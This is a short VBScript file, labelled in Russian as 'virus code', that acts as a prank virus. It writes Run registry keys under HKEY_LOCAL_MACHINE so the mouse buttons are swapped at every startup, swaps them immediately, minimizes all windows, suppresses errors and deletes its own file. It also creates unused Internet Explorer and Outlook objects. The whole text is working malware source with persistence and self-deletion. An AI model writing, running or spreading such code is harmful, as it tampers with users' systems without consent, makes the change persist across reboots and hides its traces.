'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     Поменять функции клавиш мышки местами
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"

' Минимизировать все окна
Application.MinimizeAll

'     Самоликвидироваться
FileSystemObject.deletefile WScript.ScriptFullName, True

